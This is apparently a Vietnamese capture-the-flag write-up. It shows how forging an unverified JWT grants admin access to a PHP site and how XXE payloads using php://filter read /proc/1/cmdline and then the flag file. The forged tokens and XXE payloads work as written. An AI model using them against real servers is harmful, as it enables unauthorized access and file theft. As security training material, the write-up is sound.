---
title: "Ka Cê Ét Cê"
id: "Ka_Ce_Et_Ce"
author: "nartgnourt"
description: "Bạn thực sự muốn trở thành một Web player trong câu lạc bộ KCSC? Hãy thử ghi tên bạn vào danh sách."
points: 428
difficulty: "Medium"
readTime: "8 min"
date: "15-12-2025"
---

# TL;DR

Chall là một trang web cho thông tin của clb KCSC trong đó có mục giới thiệu, thành tích và tên của các thành viên chuyên môn web exploit. Mục tiêu của ta là lấy quyền admin để cập nhập file **members.xml** để từ đó khai thác lỗ hổng **XXE** và đọc flag

# Initial reconnaissance

![](assets/fewfwdf.png)

Lục lọi khắp nơi trên web thì mình cũng không thấy có gì đặc biệt trừ trang `admin.php` bị chặn do không phải admin

![](assets/rtert.png)

Sau đấy mình tiếp tục mò đến source code

![](assets/g4rgreger.png)

**Dockerfile**

```Dockerfile
FROM php:7.4-fpm-alpine

COPY flag.txt /flag.txt

RUN apk add --no-cache --virtual .build-deps \
  autoconf \
  g++ \
  make && \
  apk del .build-deps

ENV ADMIN_PASSWORD="REDACTED"

CMD ["sh", "-c", "mv /flag.txt /flag_REDACTED.txt && php-fpm && tail -f /dev/null"]
```

Dựa vào file docker mình thấy flag sẽ có dạng `flag_cai_gi_gi_day.txt` và có lẽ bài này sẽ là một bài RCE để ls xong rồi mới đọc flag

Thứ đầu tiên đập vào mắt mình khi mở source code là hai file `JWT.php` và `KCSC.php`

**JWT.php**

```php
<?php

class JWT
{
    private static $secret = "REDACTED";

    private static function base64UrlEncode($data)
    {
        return rtrim(strtr(base64_encode($data), '+/', '-_'), '=');
    }

    private static function base64UrlDecode($data)
    {
        return base64_decode(strtr($data, '-_', '+/'));
    }

    public static function generateToken($payload, $expiresIn = 3600)
    {
        $header = [
            'typ' => 'JWT',
            'alg' => 'HS256'
        ];

        $payload['iat'] = time();
        $payload['exp'] = time() + $expiresIn;

        $headerEncoded = self::base64UrlEncode(json_encode($header));
        $payloadEncoded = self::base64UrlEncode(json_encode($payload));

        $signature = hash_hmac('sha256', "$headerEncoded.$payloadEncoded", self::$secret, true);
        $signatureEncoded = self::base64UrlEncode($signature);

        return "$headerEncoded.$payloadEncoded.$signatureEncoded";
    }

    public static function validateToken($token)
    {
        $parts = explode('.', $token);
        if (count($parts) !== 3) {
            return false;
        }

        list($headerEncoded, $payloadEncoded, $signatureEncoded) = $parts;

        $signature = self::base64UrlDecode($signatureEncoded);
        $expectedSignature = hash_hmac('sha256', "$headerEncoded.$payloadEncoded", self::$secret, true);

        if (!hash_equals($signature, $expectedSignature)) {
            return false;
        }

        $payload = json_decode(self::base64UrlDecode($payloadEncoded), true);

        if (isset($payload['exp']) && $payload['exp'] < time()) {
            return false;
        }

        return true;
    }

    public static function decodeToken($token)
    {
        $parts = explode('.', $token);
        if (count($parts) !== 3) {
            return null;
        }

        $payload = json_decode(self::base64UrlDecode($parts[1]), true);
        return $payload;
    }

    public static function refreshToken($token, $expiresIn = 3600)
    {
        if (!self::validateToken($token)) {
            throw new Exception('Invalid token');
        }

        $payload = self::decodeToken($token);
        unset($payload['iat']);
        unset($payload['exp']);

        return self::generateToken($payload, $expiresIn);
    }
}
```

**KCSC.php**

```php
<?php
require_once __DIR__ . '/JWT.php';

class KCSC
{
    public $members;

    public function __construct($members = __DIR__ . '/../members.xml')
    {
        $this->members = $members;
    }

    public function slogan()
    {
        return 'Make KMA Greater';
    }

    public function info()
    {
        return "https://www.facebook.com/kmasec.club";
    }

    public function isAdmin($token)
    {
        if (!JWT::decodeToken($token)) {
            return false;
        } else {
            $payload = JWT::decodeToken($token);
            if ($payload['role'] !== 'admin') {
                return false;
            }
            return true;
        }
    }

    public function update_members($xml_content)
    {
        libxml_use_internal_errors(true);

        $dom = new DOMDocument();
        $loaded = $dom->loadXML($xml_content, LIBXML_DTDLOAD | LIBXML_NOENT);

        if (!$loaded) {
            $errors = libxml_get_errors();
            libxml_clear_errors();
            return ['success' => false, 'message' => 'Invalid XML format: ' . $errors[0]->message];
        }

        $adminNodes = $dom->getElementsByTagName('admin');

        $admin = $adminNodes->item(0)->nodeValue;

        if (file_put_contents($this->members, $xml_content)) {
            return ['success' => true, 'message' => 'Admin ' . $admin . ' updated members.xml file'];
        } else {
            return ['success' => false, 'message' => 'Failed to write file'];
        }
    }
}
```

File `JWT.php` sau khi phân tích có vẻ chỉ là một class tạo token JWT bình thường với thuật toán **HS256**

Nhưng điểm đặc biệt là ở chỗ file `KCSC.php` sử dụng nó có một vấn đề **nghiêm trọng**

```php
public function isAdmin($token)
{
    if (!JWT::decodeToken($token)) {
        return false;
    } else {
        $payload = JWT::decodeToken($token);
        if ($payload['role'] !== 'admin') {
            return false;
        }
        return true;
    }
}
```

Mục đích của hàm này có lẽ là để kiểm tra xem JWT token của người chơi có phải là của admin hay không

Thế nhưng lỗ hổng của hàm này là ở chỗ nó chỉ kiểm tra hai thứ:

- Token đó có phải là một JWT token hợp lệ hay không

- Nếu hợp lệ thì nội dung của nó có `role` là **admin** hay không

Điều đó dẫn đến việc nếu như bất kì người nào có một token JWT hợp lệ thì cũng có thể tùy ý sửa đổi nó mà không cần quan tâm xem secret key có khớp hay không

---

Sau đấy mình phát hiện thêm endpoint này

**/api/login.php**

```php
<?php
require_once __DIR__ . '/../utils/JWT.php';

$result = new stdClass;

header('Content-Type: application/json; charset=utf-8');

if ($_SERVER['REQUEST_METHOD'] !== 'POST') {
    http_response_code(400);
    $result->message = "Only POST!";
} else {
    try {
        $data = json_decode(file_get_contents('php://input'), true);
        $username = $data['username'] ?? NULL;
        $password = $data['password'] ?? NULL;

        if ($username === NULL || $password === NULL) {
            $result->message = 'Please provide your username and password!';
        } else if ($username === 'admin' && $password === getenv('ADMIN_PASSWORD')) {
            $result->message = 'Oh, Welcome admin!';
            $result->token = JWT::generateToken(['username' => 'admin', 'role' => 'admin']);
        } else {
            $result->message = 'Hello, CTFer!';
            $result->token = JWT::generateToken(['username' => $username, 'role' => 'ctfer']);
        }
    } catch (\Throwable $th) {
    }
}

echo json_encode($result);
```

Phân tích code mình thấy nó hoạt động như sau:

Khi ta gửi một post request chứa hai tham số là `$username` và `$password` tới endpoint này thì sẽ có hai trường hợp xảy ra

- Nếu `$username` và `$password` trùng khớp với thông tin của admin thì nó sẽ trả về JWT token với role là **admin**

- Còn lại ta sẽ nhận được một token với role là **ctfer**

Và cuối cùng ở trong `admin.php`

```php
<?php
require_once __DIR__ . '/utils/JWT.php';
require_once __DIR__ . '/utils/KCSC.php';

$token = $_COOKIE['token'] ?? null;
$kcsc = new KCSC;

...

    <?php if ($kcsc->isAdmin($token)): ?>
        <div class="editor-container">
            <div class="form-group">
                <label for="xml_content">members.xml</label>
                <textarea id="xml_content"><?= htmlspecialchars($xml_content) ?></textarea>
            </div>
...
```

Mình thấy gần như toàn bộ nội dung của `/admin.php` sẽ chỉ được hiển thị nếu như hàm `isAdmin($token)` trả về giá trị **True**

# Exploit and get flag

Tổng hợp lại những thông tin đã phân tích nãy giờ, mình có kịch bản để truy cập được `/admin.php` như sau:

- Gửi một post request với `username` và `password` bất kì tới `/api/login.php`

- Nhận được một **token JWT hợp lệ** thì tiến hành lên [jwt.io](https://www.jwt.io/) để chỉnh sửa role thành **admin**

- Truy cập vào `/admin.php` với token vừa được chỉnh sửa

---

Đầu tiên ta lấy một token hợp lệ trước

![](assets/w4twrg.png)

`eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VybmFtZSI6InVzZXIiLCJyb2xlIjoiY3RmZXIiLCJpYXQiOjE3NjU3NTM2OTcsImV4cCI6MTc2NTc1NzI5N30.QHSxQa8sJIASQpCs8y5925InBi_iDjpemqRJbHlgL-U`

Sau đó tiến hành chỉnh sửa **role** thành **admin**

![](assets/rherherherh.png)

`eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VybmFtZSI6InVzZXIiLCJyb2xlIjoiYWRtaW4iLCJpYXQiOjE3NjU3NTM2OTcsImV4cCI6MTc2NTc1NzI5N30.FEiq_nL1TWznIxDAUgC-YINd-7SfUbbid9FbWYx9G_Q`

Cuối cùng là dùng nó để truy cập `/admin.php`

![](assets/ww4t4t.png)

---

Giao diện cho ta edit một file **xml** mà sau khi so sánh với `members.xml` trong phần source code thì cả hai đều giống như nhau

Đến đây mình nghĩ ngay tới việc khai thác lỗ hổng **XXE** để đọc được flag ở trên server

Quay lại file **Docker**:

```DOCKER
...
CMD ["sh", "-c", "mv /flag.txt /flag_REDACTED.txt && php-fpm && tail -f /dev/null"]
```

Flag mới đầu sẽ được đổi tên thêm một dãy kí tự ngẫu nhiên ở đằng sau nên mình không thể đoán được

Thay vào đó mình tìm cách đọc câu lệnh đó để xem nó đổi thành cái gì luôn

Ta tiến hành sửa file **xml** trên như sau:

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE root [<!ENTITY xxe SYSTEM "php://filter/read=convert.base64-encode/resource=/proc/1/cmdline">]>
<kcsc>
	<members>
    <member>
      <username>&xxe;</username>
      <role>Web</role>
    </member>
  </members>
</kcsc>
```

Cụ thể mục đích của mình là đọc nội dung của `/proc/1/cmdline` (chứa lệnh đổi tên file flag), encode nó bằng base64 qua php wrapper rồi hiển thị nó trong thẻ `username`

Đến đây mình cứ tưởng là chỉ cần vào `/members.php` để nó render là mình sẽ nhận được nội dung của nó nhưng lại không nhận được gì cả

Sau đấy mình có thử với các file khác nhưng cũng không nhận lại được gì khả quan

Ngồi mất một hồi lâu mình quyết định lục tiếp source xem có gì mình còn bỏ sót nữa không thì mình thấy việc cập nhập file `members.xml` sẽ được diễn ra như sau

- `admin.php` gửi request tới endpoint `/api/members/update.php`

  - ```php
      async function saveChanges() {
          const content = editor.getValue();
          const btn = document.querySelector('.btn-save');

          btn.disabled = true;
          btn.textContent = 'Saving...';

          try {
              const res = await fetch('/api/members/update.php', {
                  method: 'POST',
                  headers: {
                      'Content-Type': 'application/json'
                  },
                  body: JSON.stringify({
                      xml_content: content
                  })
              });
      ...
    ```

- `update.php` tiếp tục kiểm tra token của người chơi thông qua `kcsc->isAdmin($token)` rồi gọi tới `$kcsc->update_members($xml_content)`

  - ```php
      if ($_SERVER['REQUEST_METHOD'] !== 'POST') {
          http_response_code(400);
          $result->message = 'Only POST request!';
      } else {
          $token = $_COOKIE['token'] ?? null;
          if (is_null($token)) {
              http_response_code(401);
              $result->message = 'Please provide cookie token!';
          } else if (!$kcsc->isAdmin($token)) {
              http_response_code(403);
              $result->message = 'You are not admin!';
          } else {
              $input = file_get_contents('php://input');
              $data = json_decode($input, true);

              if (!isset($data['xml_content'])) {
                  http_response_code(400);
                  $result->message = 'Missing xml_content parameter!';
              } else {
                  $xml_content = $data['xml_content'];
                  $updateResult = $kcsc->update_members($xml_content);

                  if ($updateResult['success']) {
                      $result->message = $updateResult['message'];
                  } else {
                      http_response_code(400);
                      $result->message = $updateResult['message'];
                      if (isset($updateResult['errors'])) {
                          $result->errors = $updateResult['errors'];
                      }
                  }
              }
          }
      }
    ```

- Hàm `$kcsc->update_members($xml_content)` kiểm tra xem nội dung của file **xml** mình gửi có hợp lệ không, nếu có thì tiến hành cập nhật vào file `members.xml`

Điểm đặc biệt nằm ở trong hàm `update_members`

**KCSC.php**

```php
public function update_members($xml_content)
{
    libxml_use_internal_errors(true);

    $dom = new DOMDocument();
    $loaded = $dom->loadXML($xml_content, LIBXML_DTDLOAD | LIBXML_NOENT);

    if (!$loaded) {
        $errors = libxml_get_errors();
        libxml_clear_errors();
        return ['success' => false, 'message' => 'Invalid XML format: ' . $errors[0]->message];
    }

    $adminNodes = $dom->getElementsByTagName('admin');

    $admin = $adminNodes->item(0)->nodeValue;

    if (file_put_contents($this->members, $xml_content)) {
        return ['success' => true, 'message' => 'Admin ' . $admin . ' updated members.xml file'];
    } else {
        return ['success' => false, 'message' => 'Failed to write file'];
    }
}
```

Biến `$admin` sẽ lấy nội dung từ tag `admin` ở trong file xml rồi sau đó nếu như mà cập nhật file thành công thì sẽ trả về response chứa nội dung đó

```php
return ['success' => true, 'message' => 'Admin ' . $admin . ' updated members.xml file'];
```

Do đó mình thử chỉnh sửa cho file xml sao cho phần nội dung file mình cần đọc sẽ nằm trong tag `admin`

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE root [<!ENTITY xxe SYSTEM "php://filter/read=convert.base64-encode/resource=/proc/1/cmdline">]>

<admin>&xxe;</admin>
```

Quả thực là mình đã nhận được nội dung file

![](assets/4t34t344.png)

```json
{
  "message": "Admin c2gALWMAbXYgL2ZsYWcudHh0IC9mbGFnX2Y0NmVmOTQyNzQzMjI1ZjA5NDk5OWIyNmFmMzA4MGQwLnR4dCAmJiBwaHAtZnBtIC1EICYmIGh0dHBkIC1EIEZPUkVHUk9VTkQgJiYgdGFpbCAtZiAvZGV2L251bGwA updated members.xml file"
}
```

Decode ra ta được

`sh-cmv /flag.txt /flag_f46ef942743225f094999b26af3080d0.txt && php-fpm -D && httpd -D FOREGROUND && tail -f /dev/null`

Việc còn lại là chỉ việc đọc `/flag_f46ef942743225f094999b26af3080d0.txt` là sẽ có được flag

**Payload**

```php
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE root [<!ENTITY xxe SYSTEM "php://filter/read=convert.base64-encode/resource=/flag_f46ef942743225f094999b26af3080d0.txt">]>

<admin>&xxe;</admin>
```

`S0NTQ3swaGhfdzQwMDAwX2NodWNfbXVuOV9iNG5fZDRfN3IwXzdoNG5oX20wN183aDRuaF92MTNuX2N1NF9rYzVjX25oMDAwMH0=`

**Flag**: `KCSC{0hh_w40000_chuc_mun9_b4n_d4_7r0_7h4nh_m07_7h4nh_v13n_cu4_kc5c_nh0000}`
